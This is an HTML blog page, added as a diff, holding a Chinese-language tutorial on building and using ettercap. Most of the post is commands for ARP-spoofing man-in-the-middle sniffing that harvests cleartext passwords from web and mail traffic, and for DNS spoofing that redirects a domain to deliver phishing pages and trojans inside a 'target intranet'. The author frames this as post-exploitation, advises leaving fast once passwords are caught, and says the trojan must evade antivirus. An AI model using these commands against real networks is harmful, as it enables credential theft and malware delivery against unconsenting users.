@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="宝刀未老之 ettercap 基础使用 [一]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>宝刀未老之 ettercap 基础使用 [一] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/10/25/ettercap/">
+                宝刀未老之 ettercap 基础使用 [一]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-10-25</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/ettercap/">ettercap</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>0x01 关于ettercap<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">ettercap</span> 确实已经非常老了,也确实是那个时代的经典,而且差不多三四年这个项目也都没再更新过了</div><div class="line">对于一些防护并不是特别好的内网,依然非常实用,千万不要觉得工具老就没有它的应用场地,那样你就真的错了,如果真是这样,就不会有这么多的二次深度开发了</div><div class="line">大家可能也发现了,像这类的工具我基本都是在模拟真实的生产机器环境上编译安装的</div><div class="line">具体原因大家想必都很清楚,像这类基于二层的arp嗅探是没法直接在远程做的,毕竟不是直接处在目标的vpn内网中</div><div class="line">socks代理再牛逼,它也只是个基于端口的四层代理,并不是vpn,所以,是没法直接在本地嗅远程的arp的,至于GRE隧道,咱们抽空再另说</div><div class="line">话不多讲,直奔今天的主题,ettercap基础使用,注意,此次仅仅是基础使用</div></pre></td></tr></table></figure></p>
+<p>0x02 开启本地的路由转发<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span></div><div class="line"><span class="meta">#</span><span class="bash"> cat /proc/sys/net/ipv4/ip_forward</span></div></pre></td></tr></table></figure></p>
+<p>0x03 基础演示环境<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">CentOS</span> <span class="selector-tag">release</span> 6<span class="selector-class">.9</span> (<span class="selector-tag">Final</span>)  <span class="selector-tag">x86-64</span> <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.4</span>  接口名称: <span class="selector-tag">eth2</span>  <span class="selector-tag">ettercap</span>所在机器</div><div class="line"><span class="selector-tag">win2008r2</span> 			   <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span> </div><div class="line"><span class="selector-tag">win7cn</span>				   <span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.8</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>0x04 暂以centos 6.8 x86_64为例,编译安装 ettercap 0.8.2<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> yum groupinstall <span class="string">"Development tools"</span> -y</span></div><div class="line"><span class="meta">#</span><span class="bash"> yum install cmake ncurses ncurses-devel openssl openssl-devel gcc-c++ flex bison gtk2 gtk2-devel -y</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar xf ettercap-0.8.2.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> ettercap-0.8.2/bundled_deps/</span></div><div class="line"><span class="meta">#</span><span class="bash"> ls</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> check/</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar xf check-0.9.14.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> check-0.9.14</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $? &amp;&amp; <span class="built_in">cd</span> ../../</span></div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> curl/</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar xf curl-7.41.0.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> curl-7.41.0</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $? &amp;&amp; <span class="built_in">cd</span> ../../</span></div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> libnet/</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar xf libnet-1.1.6.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> libnet-1.1.6</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $? &amp;&amp; <span class="built_in">cd</span> ../../</span></div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> luajit/</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar xf LuaJIT-2.0.3.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> LuaJIT-2.0.3</span></div><div class="line"><span class="meta">#</span><span class="bash"> make &amp;&amp; make install</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $? &amp;&amp; <span class="built_in">cd</span> ../../</span></div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> tar xf libpcap-1.5.3.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> libpcap-1.5.3</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $? &amp;&amp; <span class="built_in">cd</span> ../../</span></div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> cat INSTALL</span></div><div class="line"><span class="meta">#</span><span class="bash"> mkdir build</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> build/</span></div><div class="line"><span class="meta">#</span><span class="bash"> cmake ../</span></div><div class="line"><span class="meta">#</span><span class="bash"> make &amp;&amp; make install</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $? &amp;&amp; <span class="built_in">cd</span></span></div></pre></td></tr></table></figure>
+<p>0x05 ettercap安装后的默认配置文件位置如下,修改配置文件,让其以root权限身份运行,一般嗅探都是在提权成功以后的动作,这样能嗅到的东西会更多一些<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /etc/ettercap/</span></div><div class="line"><span class="meta">#</span><span class="bash"> vi /etc/ettercap/etter.conf</span></div><div class="line"> ec_uid = 0                </div><div class="line"> ec_gid = 0</div></pre></td></tr></table></figure></p>
+<p>0x06 ettercap默认规则 [filter] 目录<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> ll /usr/<span class="built_in">local</span>/share/ettercap/</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ettercap-filter.png" alt=""></p>
+<p>0x07 装完以后先简单测试下ettercap是否真正已经可用,尝试嗅下3.8到3.23之间的明文数据<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ettercap -Tqi eth2 -M arp:remote /<span class="number">192.168</span><span class="meta">.3</span><span class="meta">.8</span>/ /<span class="number">192.168</span><span class="meta">.3</span><span class="meta">.23</span>/</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ettercap-rest.png" alt=""></p>
+<p>0x08 ettercap 选项功能简要说明<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">M 进行中间人攻击,可自行指定用什么类型的中间人,如,arp,dhcp,icmp...</span></div><div class="line">-<span class="ruby">o 不嗅探数据,单单只进行中间人欺骗</span></div><div class="line">-<span class="ruby">T 建议使用文本模式,一般实战中基本是不会有图形界面给你的</span></div><div class="line">-<span class="ruby">q 安静模式,减少输出</span></div><div class="line">-<span class="ruby">D 把ettercap作为一个系统服务来运行,意思就是让它在后台跑,比较方便</span></div><div class="line">-<span class="ruby">w 把监听的数据写到指定的pcap文件中 </span></div><div class="line">-<span class="ruby">L 将所有流量写到指定的日志文件中</span></div><div class="line">-<span class="ruby">l 被动记录</span></div><div class="line">-<span class="ruby">i 指定要用于嗅探的网卡接口</span></div><div class="line">-<span class="ruby">F 导入自定义数据包过滤规则文件</span></div><div class="line">-<span class="ruby">P 导入插件,增强中间人攻击</span></div><div class="line">-<span class="ruby">p 不启用网卡混杂模式,只嗅当前机器的各类明文数据</span></div></pre></td></tr></table></figure></p>
+<p>0x09 关于ettercap的其它更多详情,请自行参考工具自身帮助<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> man ettercap</span></div><div class="line"><span class="meta">#</span><span class="bash"> ettercap -P list  查看ettercap内置的所有插件</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ettercap-local-plugins.png" alt=""></p>
+<p>0x10 只嗅探本机指定端口上的明文数据,如,各类web管理登陆密码[80,8080],如果是当前机器是个邮件服务器,无疑是极好的,起码不用再自己苦逼的到处搜集密码了,直接守住这儿慢慢抓密码就好了,在某些内网中通过这种方式来搜集密码,还是非常可行的<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> ettercap -i eth2 -T -q -p -l <span class="built_in">local</span> //25,80,110,143,8080 </span></div><div class="line"><span class="meta">#</span><span class="bash"> etterlog local.eci</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ettercap-local-sniff.png" alt=""><br><img src="/img/ettercap-local-sniff_res.png" alt=""></p>
+<p>0x011 只嗅探指定机器之间的明文通信数据</p>
+<p>嗅探这个ip段范围和网关之间的通信数据,其实说白点就是想嗅探目标机器在一些公网站点上登陆的明文账号密码<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> ettercap -T -q -i eth2  -L webadmin -M arp:remote /192.168.3.1/ /192.168.3.2-25/    </span></div><div class="line"><span class="meta">#</span><span class="bash"> etterlog webadmin.eci</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/arp_sniffer_common.png" alt=""></p>
+<p>嗅探3.220-251和3.3这台机器之间的所有明文通信数据,主要想快速拿到内网服务器的账号密码,所以,你实际挑内网机器的时候,最好有针对性,一旦拿到密码立马就跑路,这工具动静儿太大<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> ettercap -Tq -i eth2  -L mail -M arp:remote /192.168.3.3/ /192.168.3.220-251/</span></div><div class="line"><span class="meta">#</span><span class="bash"> etterlog mail.eci</span></div></pre></td></tr></table></figure></p>
+<p>在目标内网中利用dns欺骗来针对性钓鱼挂马,马要免杀,页面也逼真,否则很容易被发现<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># vi /etc/ettercap/etter.dns</div><div class="line">  # microsoft sucks ;)找到这行</div><div class="line">  # redirect it to www.linux.org</div><div class="line">    demlution.com       A   <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span></div><div class="line">    www.demlution.com   A   <span class="number">192.168</span><span class="number">.3</span><span class="number">.23</span></div><div class="line"># ettercap -Tq -i eth2 -P dns_spoof  -M arp /<span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span>/ /<span class="number">192.168</span><span class="number">.3</span><span class="number">.3</span><span class="number">-100</span>/</div></pre></td></tr></table></figure></p>
+<p><img src="/img/ettercap-dns2_res.png" alt=""><br><img src="/img/ettercap-dns.png" alt=""><br><img src="/img/ettercap-dns2.png" alt=""></p>
+<p>0x12 当然,ettercap绝非远远就这么点儿功用,来日方长,关于定制规则脚本以及其它的各类高级应用,考虑篇幅,我们后续再慢慢说</p>
+<p>0x13 提前先来了解几个 ettercap 的简单规则脚本语法<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">search</span><span class="params">(where,what)</span></span> 从字符串where中查找what，若找到则返回true</div><div class="line"><span class="function"><span class="title">regex</span><span class="params">(where,regex)</span></span> 从字符串where中匹配正则表达式regex，若找到则返回true</div><div class="line"><span class="function"><span class="title">replace</span><span class="params">(what,with)</span></span> 把字符串what替换成字符串with</div><div class="line"><span class="function"><span class="title">log</span><span class="params">(what,where)</span></span>    把字符串what记录到where文件中</div><div class="line"><span class="function"><span class="title">msg</span><span class="params">(message)</span></span> 	   在屏幕上显示出字符串message</div><div class="line"><span class="function"><span class="title">exit</span><span class="params">()</span></span> 		   退出</div></pre></td></tr></table></figure></p>
+<p>待续ing…</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/ettercap/">#ettercap</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
